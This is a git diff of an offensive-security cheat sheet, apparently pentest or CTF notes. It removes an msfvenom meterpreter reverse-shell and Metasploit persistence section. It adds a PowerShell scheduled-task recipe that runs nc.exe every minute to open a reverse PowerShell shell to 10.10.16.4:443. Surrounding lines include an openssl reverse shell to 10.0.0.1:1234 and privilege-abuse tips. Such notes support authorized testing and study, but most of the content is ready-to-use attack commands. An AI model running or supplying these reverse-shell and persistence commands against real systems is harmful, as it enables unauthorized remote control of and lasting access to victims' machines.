@@ -1566,13 +1566,6 @@ BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
 
 - Navigate to the tools tab and select the Active Directory Users and Computers -- This will pull up a list of all users on the domain as well as some other useful tabs to use such as groups and computers
 
-### Maintaining Access
-
-- msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe
-- upload shell.exe to windows target
-- once you have a meterpreter session background the session
-- use exploit/windows/local/persistance and run
-
 ### Token Impersonation 
 
  `whoami /all` look for privileges to abuse. most commonly abused privileges https://steflan-security.com/linux-privilege-escalation-token-impersonation/
@@ -1893,6 +1886,36 @@ openssl s_server -key key.pem -cert cert.pem -port 1234
 **Step 3**
 ```
 mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -connect 10.0.0.1:1234 > /tmp/s 2> /dev/null; rm /tmp/s
+```
+
+## Maintaining Access
+
+### Via Windows Task
+
+PowerShell
+
+```
+$Action = New-ScheduledTaskAction -Execute 'C:\windows\system32\cmd.exe' -Argument '/c C:\ProgramData\nc.exe 10.10.16.4 443 -e C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+```
+
+```
+$Trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Days 1) -At (Get-Date) -Once
+```
+
+```
+$Settings = New-ScheduledTaskSettingsSet
+```
+
+```
+$Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Settings $Settings
+```
+
+```
+Register-ScheduledTask -TaskName 'TheScriptKid' -InputObject $Task
+```
+
+```
+Start-ScheduledTask -TaskName 'TheScriptKid'
 ```
 
 ## PTY Shells
